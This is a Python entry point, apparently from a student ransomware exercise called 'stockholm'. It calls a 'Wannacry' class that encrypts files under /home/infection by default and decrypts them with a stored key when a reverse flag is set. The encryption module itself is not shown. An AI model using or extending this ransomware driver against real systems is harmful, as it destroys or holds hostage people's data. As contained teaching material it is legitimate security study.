import os
from args import optparsing
from dotenv import load_dotenv
from wannacry import Wannacry
from logger import log_error

load_dotenv()  # take environment variables from .env.

def main():
    args = optparsing()
    os.environ['STOCKHOLM_IS_SILENT'] = str(args.silent)
    infect_path = args.path if args.path else '/home/infection'
    if args.reverse:
        wannacry = Wannacry()
        if not wannacry.fernet:
            log_error('No existing symmetric key')
            exit(1)
        wannacry.decrypt(infect_path)
    else:
        wannacry = Wannacry(is_create=True)
        wannacry.encrypt(infect_path)

if __name__ == '__main__':
    main()